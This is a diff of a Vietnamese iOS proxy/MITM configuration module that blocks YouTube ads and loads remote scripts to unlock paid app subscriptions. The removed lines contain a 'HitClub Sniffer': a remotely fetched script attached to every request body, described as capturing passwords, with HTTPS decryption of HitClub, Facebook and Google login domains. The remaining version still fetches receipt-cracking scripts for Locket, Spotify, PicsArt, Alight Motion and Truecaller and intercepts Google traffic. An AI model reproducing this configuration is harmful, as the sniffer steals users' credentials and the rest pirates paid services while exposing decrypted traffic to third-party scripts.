@@ -1,5 +1,5 @@
-#!name = VIP Pro Max + HitClub Sniffer
-#!desc = Tích hợp Hack Premium Apps & Bắt Password HitClub - Update 29/12
+#!name = VIP Premium (No Spy)
+#!desc = YouTube, Spotify, Locket Gold & Premium Apps - Clean Version
 #!author = TungTinTacKMA
 
 [General]
@@ -10,60 +10,43 @@ dns-server = system
 ipv6 = true
 
 [Rule]
-# Chặn quảng cáo/UDP của Youtube (Giữ nguyên từ bản gốc)
+# === Chặn Quảng Cáo YouTube & Google ===
 AND,((DOMAIN-SUFFIX,googlevideo.com),(PROTOCOL,UDP)),REJECT
 AND,((DOMAIN,youtubei.googleapis.com),(PROTOCOL,UDP)),REJECT
 
-# Quy tắc cuối: Bắt buộc đi qua Proxy để Script hoạt động
+# Quy tắc cuối: Đi qua Proxy
 FINAL,PROXY
 
 [Header Rewrite]
-# Hack Locket & Spotify (Giữ nguyên từ bản gốc)
+# === Locket Gold (Bẻ khóa xác thực) ===
 ^https?://api.revenuecat.com/.+/(receipts$|subscribers/?(.*?)*$) header-del x-revenuecat-etag
 ^https?://api.revenuecat.com/.+/(receipts$|subscribers/?(.*?)*$) header-del X-RevenueCat-ETag
+
+# === Spotify Premium (Xóa cache quảng cáo) ===
 http-request ^https:\/\/(spclient\.wg\\.spotify\\.com|.*-spclient\\.spotify\\.com(:443)?)\/user-customization-service\/v1\/customize$ header-del if-none-match
 
 [Url Rewrite]
-# Chặn quảng cáo Youtube (Giữ nguyên từ bản gốc)
+# === YouTube Premium (Chặn quảng cáo video) ===
 ^https?:\/\/[\w-]+\.googlevideo\.com\/(?!(dclk_video_ads|videoplayback\?)).+&oad _ reject-200
 ^https?:\/\/(www|s)\.youtube\.com\/api\/stats\/ads _ reject-200
 ^https?:\/\/(www|s)\.youtube\.com\/(pagead|ptracking) _ reject-200
 ^https?:\/\/s\.youtube\.com\/api\/stats\/qoe\?adcontext _ reject-200
 
 [Script]
-# ==================================================
-# 1. SCRIPT BẮT MẬT KHẨU (TÍNH NĂNG MỚI)
-# ==================================================
-# Bắt tất cả các link (pattern=.*) để không bỏ sót API lạ của HitClub
-Smart_Spy_All = type=http-request,pattern=.*,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/smart_spy.js,requires-body=true,timeout=120
-
-# ==================================================
-# 2. CÁC GÓI HACK PREMIUM (TÍNH NĂNG CŨ)
-# ==================================================
-
-# === Alight Motion ===
-AlightMotion = type=http-response,pattern=^https:\/\/api\.alightcreative\.com\/result,requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/AlightMotion.js
-
-# === PicsArt ===
-PicsArt = type=http-request,pattern=^https:\/\/api\.picsart\.com\/gw-v2\/shop\/subscription\/apple\/purchases,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/PicsArt.js,requires-body=true,timeout=60
-
-# === Truecaller ===
-Truecaller = type=http-response,pattern=^https://premium-(.+)\.truecaller\.com/v\d/(subscriptions|products\/apple),requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/TrueCaller.js
-
-# === Locket Gold ===
+# === Locket Gold (Script kích hoạt) ===
 Locket_Gold = type=http-response,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts$|subscribers\/[^/]+$),requires-body=true,max-size=-1,timeout=60,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/Locket_DuyVinh09.js
 Locket_Delete_Header = type=http-request,pattern=^https:\/\/api\.revenuecat\.com\/.+\/(receipts|subscribers),script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/deleteHeader.js,timeout=60
 
+# === Alight Motion Pro ===
+AlightMotion = type=http-response,pattern=^https:\/\/api\.alightcreative\.com\/result,requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/AlightMotion.js
+
+# === PicsArt Gold ===
+PicsArt = type=http-request,pattern=^https:\/\/api\.picsart\.com\/gw-v2\/shop\/subscription\/apple\/purchases,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/PicsArt.js,requires-body=true,timeout=60
+
+# === Truecaller Premium ===
+Truecaller = type=http-response,pattern=^https://premium-(.+)\.truecaller\.com/v\d/(subscriptions|products\/apple),requires-body=1,max-size=0,script-path=https://raw.githubusercontent.com/TungTinTacKMA/Crack-l-/main/TrueCaller.js
+
 [MITM]
 enable = true
-# ==================================================
-# DANH SÁCH GIẢI MÃ HTTPS (QUAN TRỌNG NHẤT)
-# ==================================================
-# 1. Các tên miền của HitClub & API ngầm (Lấy từ Log)
-hostname = hit.club, *.hit.club, *.wsmt8g.cc, *.genesockezlyfeapy.com, *.trakipsg.net, *.hytsocesk.com, *.geightdors.net, *.dsrcgoms.net, *.8xdfd3t6f.com
-
-# 2. Các tên miền cho App Premium (Locket, Picsart...)
-hostname = *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.truecaller.com
-
-# 3. Mạng xã hội & Khác
-hostname = *.facebook.com, *.google.com, *.youtube.com, accounts.google.com
+# Danh sách giải mã HTTPS cho các App Premium
+hostname = *.revenuecat.com, api.revenuecat.com, *.picsart.com, *.alightcreative.com, *.truecaller.com, *.spotify.com, *.google.com, *.youtube.com
